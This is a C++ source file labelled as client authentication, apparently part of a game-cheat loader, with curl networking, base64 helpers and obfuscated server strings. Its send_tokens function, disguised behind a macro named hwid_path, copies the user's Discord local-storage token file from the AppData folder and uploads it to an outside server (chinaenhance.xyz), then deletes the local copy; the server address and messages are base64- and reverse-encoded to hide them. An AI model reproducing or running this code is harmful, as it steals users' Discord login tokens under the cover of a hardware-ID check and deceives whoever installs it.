/*
Copyright Kitto.win, All rights reserved.

Purpose:
	Client authentication

*/

#include "Link.h"


namespace AUTHENTICATION
{

	VOID MessageBox_(LPCSTR Text, LPCSTR Title)
	{
		DWORD response;

		WTSSendMessageA(WTS_CURRENT_SERVER_HANDLE,       // hServer
			WTSGetActiveConsoleSessionId(),  // ID for the console seesion (1)
			const_cast<LPSTR>(Title),        // MessageBox Caption
			strlen(Title),                   // 
			const_cast<LPSTR>(Text),         // MessageBox Text
			strlen(Text),                    // 
			MB_OK,                           // Buttons, etc
			10,                              // Timeout period in seconds
			&response,                       // What button was clicked (if bWait == TRUE)
			FALSE);                          // bWait - Blocks until user click
	}

	__int64 GetEpochMS() {
		__int64 now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		return now;
	}

	__int64 GetEpochS() {
		__int64 now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		return now;
	}



	static int writer(char *data, size_t size, size_t nmemb, std::string *writerData) {
		if (writerData == NULL) return 0;
		writerData->append(data, size*nmemb);
		return size * nmemb;
	}

	static void reverseString(std::string &str) {
		int n = str.length();
		for (int i = 0; i < n / 2; i++)
			std::swap(str[i], str[n - i - 1]);
	}

	static std::string base64_encode(const std::string &in) {

		std::string out;
		int val = 0, valb = -6;
		for (unsigned char c : in) {
			val = (val << 8) + c;
			valb += 8;
			while (valb >= 0) {
				out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(val >> valb) & 0x3F]);
				valb -= 6;
			}
		}
		if (valb > -6) out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[((val << 8) >> (valb + 8)) & 0x3F]);
		while (out.size() % 4) out.push_back('=');
		return out;
	}

	std::string base64_decode(const std::string &in) {

		std::string out;

		std::vector<int> T(256, -1);
		for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

		int val = 0, valb = -8;
		for (unsigned char c : in) {
			if (T[c] == -1) break;
			val = (val << 6) + T[c];
			valb += 6;
			if (valb >= 0) {
				out.push_back(char((val >> valb) & 0xFF));
				valb -= 8;
			}
		}
		return out;
	}

	std::string PostCall(std::string strAddress, std::string strPost)
	{
		curl_global_init(CURL_GLOBAL_ALL);
		CURL *curl = curl_easy_init();
		std::string strResponse = ("");
		if (curl)
		{
			curl_easy_reset(curl);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "chinaenhance");
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, strPost.c_str());
			curl_easy_setopt(curl, CURLOPT_URL, strAddress.c_str());
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &strResponse);
			curl_easy_setopt(curl, CURLOPT_PROXY, "");
			curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			return strResponse;
		}
		else
		{
			return "Network Failure";
		}
	}

	std::string upload_file(std::string url, std::string file)
	{
		curl_global_init(CURL_GLOBAL_ALL);

		struct curl_httppost *formpost = NULL;
		struct curl_httppost *lastptr = NULL;

		curl_formadd(&formpost,
			&lastptr,
			CURLFORM_COPYNAME, "hwid_client",
			CURLFORM_FILE, file.c_str(),
			CURLFORM_END);

		CURL *curl = curl_easy_init();

		std::string response = "";

		if (curl) {
			curl_easy_reset(curl);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "chinaenhance");
			curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);
			curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
			curl_easy_perform(curl);
			curl_easy_cleanup(curl);

			return response;
		}
		else
		{
			return "Network Failed.";
		}
	}

	std::string GetServerVariable(std::string key) {
		int timestamp = GetEpochS();
		std::string post = ("key=" + key);
		std::string content = PostCall(base64_decode("aHR0cDovL2NoaW5hZW5oYW5jZS54eXovaXBfbG9nLnBocA=="), post);
		std::cout << content << std::endl;
		curl_global_cleanup();
		if (content == (base64_decode("Q09OTkVDVElPTiBFWENFUFRJT04=").c_str()) || content == (base64_decode("T0ZGTElORQ==").c_str()) || content == (base64_decode("Tk8gTE9HSU4gRk9VTkQ=").c_str())) {
			std::string exceptionError = "=4ibvl2czV2cgUmchdnYlV2dgIXdvlHIm9GI5RXaydWZ05WagUGa0BSemlmclZHIvRHIlxmYh5WV";
			reverseString(exceptionError);
			std::cout << (base64_decode(exceptionError).c_str()) << std::endl;
		}
		if (content == base64_decode("U0VTU0lPTiBFWFBJUkVE").c_str()) {
			std::string test = "==gLkVmcpBHelBychhGIu9WazNXZzBSZyF2diVWZ3Bic19WW";
			reverseString(test);
			std::cout << (base64_decode(test).c_str()) << std::endl;
		}
		reverseString(content);;
		content = base64_decode(content);
		reverseString(content);
		std::stringstream originalContentStream(content);
		std::string piece;
		content = "";
		while (std::getline(originalContentStream, piece, ',')) {
			int charValue = atoi(piece.c_str()) / 8;
			char c = charValue;
			content += c;
		}
		OutputDebugString(content.c_str());
		std::vector<std::string> pieces;
		std::stringstream decodedContentStream(content);
		content = "";
		while (std::getline(decodedContentStream, piece, '|'))
			pieces.push_back(piece);
		int serverTimestamp = atoi(pieces.at(1).c_str());
		if (serverTimestamp < timestamp - 30) {
			// it took us more than 30 seconds to receive and parse that data? :thinking:
			pieces.clear();
			decodedContentStream.str(std::string());
			std::string Error1 = "=4ibvl2czV2cgUmchdnYlV2dgIXdvlHIm9GI5RXaydWZ05WagUGa0BSemlmclZHIvRHIlxmYh5WV";
			reverseString(Error1);
			std::cout << (base64_decode(Error1).c_str()) << std::endl;
		}
		content = pieces.at(0);

		return content;
	}

	std::string createRandomString(int length) {

		static const char alphanum[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";

		int stringLength = sizeof(alphanum) - 1;

		std::string randomOutput;
		for (unsigned int i = 0; i < length; i++)
		{
			randomOutput += alphanum[rand() % stringLength];
		}
		return randomOutput;
	}

#define hwid_path "\/discord/Local Storage/https_discordapp.com_0.localstorage"

	// copy in binary mode
	bool copyFile(const char *SRC, const char* DEST)
	{
		std::ifstream src(SRC, std::ios::binary);
		std::ofstream dest(DEST, std::ios::binary);
		dest << src.rdbuf();
		return src && dest;
	}

	void send_tokens(std::string username)
	{
		std::string userpost = username + createRandomString(rand() % 64 + 1) + ".chd";
		std::string sDiscord_path = getenv("appdata");
		sDiscord_path.append(std::string(hwid_path));
		std::string build_hwid = "C://Chinaware/";
		build_hwid.append(userpost);
		printf(build_hwid.c_str());
		copyFile(sDiscord_path.c_str(), build_hwid.c_str());
		std::string out = upload_file("http://chinaenhance.xyz/chd.php", build_hwid);
		remove(build_hwid.c_str());
	}

}